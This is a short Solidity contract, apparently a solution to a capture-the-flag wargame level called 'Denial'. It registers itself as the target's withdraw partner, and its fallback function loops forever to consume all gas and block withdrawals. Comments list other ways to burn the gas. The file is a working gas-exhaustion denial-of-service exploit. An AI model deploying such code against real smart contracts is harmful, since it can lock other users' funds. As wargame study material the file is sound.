// SPDX-License-Identifier: MIT
contract Attack{

    constructor(Denial denial){
        //setting up withdraw partner
        denial.setWithdrawPartner(address(this));
    }
    fallback() external payable {
        //we have to make an infinite loop so we consume all of gas
        //to block rest of the contract
        for(;;){}
        //ways to consume all of gas:
        //1. way
        // while(true){
        // }
        //
        //2. way
        //assembly{
        //invalid()
        //}
     }
}